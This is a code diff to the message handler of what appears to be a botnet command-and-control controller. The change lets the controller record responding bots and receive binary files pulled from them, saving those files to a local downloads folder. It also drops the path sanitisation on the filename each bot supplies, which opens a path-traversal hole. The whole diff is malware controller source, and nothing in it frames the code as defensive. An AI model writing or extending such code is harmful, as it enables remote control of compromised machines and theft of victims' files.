@@ -69,35 +69,25 @@ def handle_message(message: dict):
     target = message.get("target")
     sender = message.get("sender")
     
+    # DEBUG: Show all incoming messages
+    print(f"\n[DEBUG] Msg recv: type={msg_type}, target={target}, sender={sender}, keys={list(message.keys())}")
+    
     # Track any bot that responds (but not ourselves)
     if sender and sender != CONTROLLER_ID and not sender.endswith("1"):
         discovered_bots.add(sender)
     
     # Only handle responses targeted at us
-    if msg_type != "response":
+    if msg_type not in ("response", "file_response"):
         return
     if target != "ME":
         return
     
     output = message.get("output", "")
     
-    # Handle file copy responses
-    if output.startswith("FILE_START:"):
-        # Parse: FILE_START: /path/to/file\n<content>\nFILE_END
-        lines = output.split('\n', 1)
-        if len(lines) < 2:
-            print(f"\n[!] Invalid file response from {sender}\n")
-            return
-            
-        file_path = lines[0].replace("FILE_START:", "").strip()
-        file_content = lines[1]
-        
-        # Remove FILE_END marker if present
-        if file_content.endswith("\nFILE_END"):
-            file_content = file_content[:-9]  # Remove "\nFILE_END"
-        
-        # Extract filename from path
-        filename = os.path.basename(file_path)
+    # Handle binary file response
+    if msg_type == "file_response":
+        filename = message.get("filename", "unknown")
+        file_data = message.get("file_data", b"")
         
         # Create downloads directory
         downloads_dir = "downloads"
@@ -107,15 +97,16 @@ def handle_message(message: dict):
         local_path = os.path.join(downloads_dir, filename)
         try:
             with open(local_path, 'wb') as f:
-                f.write(file_content.encode('utf-8'))
+                f.write(file_data)
             
-            file_size = len(file_content)
+            file_size = len(file_data)
             print(f"\n[✓] File saved: {local_path} ({file_size} bytes) from {sender}\n")
         except Exception as e:
             print(f"\n[!] Failed to save file: {e}\n")
-    else:
-        # Regular command response
-        print(f"\n[+] RESPONSE from {sender}:\n{output}\n")
+        return
+    
+    # Regular text response
+    print(f"\n[+] RESPONSE from {sender}:\n{output}\n")
 
 
 def parse_command(cmd_str: str) -> tuple:
